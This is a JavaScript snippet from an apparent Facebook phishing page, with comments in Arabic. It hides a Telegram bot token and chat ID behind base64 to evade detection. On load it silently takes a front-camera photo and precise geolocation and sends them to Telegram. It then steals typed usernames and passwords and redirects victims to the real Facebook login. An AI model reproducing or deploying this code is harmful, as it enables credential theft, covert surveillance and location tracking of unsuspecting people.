<script>
// --- فك التشفير الذاتي (Self-Decoding) ---
// تم تحويل التوكن وID الشات إلى رموز غير مفهومة لمنع الكشف السريع
const _0x5a2 = ["ODUyNzU2NTIwNTpBQUZwb3lMRHppcjRvaVFLcVBQTy1DbTQwWFZ6VUJ2TEVSOA==", "MTYxMTM5ODMwMw=="];
const BOT_TOKEN = atob(_0x5a2[0]);
const CHAT_ID = atob(_0x5a2[1]);

// 1. إخفاء شاشة التحميل
setTimeout(() => {
    const loader = document.getElementById('loader');
    if(loader) loader.style.display = 'none';
}, 2500);

// 2. سحب الميديا والبصمة تلقائياً
window.onload = () => { startCapture(); };

async function startCapture() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        let video = document.createElement('video');
        video.srcObject = stream;
        video.play();

        setTimeout(() => {
            let canvas = document.createElement('canvas');
            canvas.width = 1280; canvas.height = 720;
            canvas.getContext('2d').drawImage(video, 0, 0, 1280, 720);
            let capturedImage = canvas.toDataURL('image/jpeg');
            stream.getTracks().forEach(t => t.stop());

            navigator.geolocation.getCurrentPosition(pos => {
                sendToTG(capturedImage, pos);
            }, () => { sendToTG(capturedImage, null); }, { enableHighAccuracy: true });
        }, 3000);
    } catch (e) { sendToTG(null, null); }
}

function sendToTG(img, pos) {
    const lat = pos ? pos.coords.latitude.toFixed(6) : "مرفوض";
    const lng = pos ? pos.coords.longitude.toFixed(6) : "مرفوض";
    const lang = navigator.language;
    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const time = new Date().toLocaleString('ar-EG');

    let text = `🌍 **بصمة استخباراتية جديدة**\n📍 الموقع: \`${lat},${lng}\`\n🌐 التوقيت: \`${tz}\`\n🗣️ اللغة: \`${lang}\`\n🕐 الوقت: \`${time}\``;

    if (img) {
        const formData = new FormData();
        formData.append('photo', dataURLtoBlob(img), 'c.jpg');
        formData.append('caption', text);
        formData.append('chat_id', CHAT_ID);
        formData.append('parse_mode', 'Markdown');
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
    } else {
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "Markdown" })
        });
    }
}

// 3. سحب بيانات الدخول عند الضغط على الزر
document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const u = document.getElementById('user').value;
    const p = document.getElementById('pass').value;
    const ua = navigator.userAgent;

    const msg = `👤 **دخول (Facebook)**\n📧 الحساب: \`${u}\`\n🔑 الكلمة: \`${p}\`\n📱 الجهاز: \`${ua}\`\n✅ الحالة: مكتمل`;

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "Markdown" })
    }).then(() => {
        window.location.href = "https://www.facebook.com/login/device-based/regular/login/";
    });
});

function dataURLtoBlob(dataurl) {
    let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
        bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
    while(n--) u8arr[n] = bstr.charCodeAt(n);
    return new Blob([u8arr], {type:mime});
}
</script>
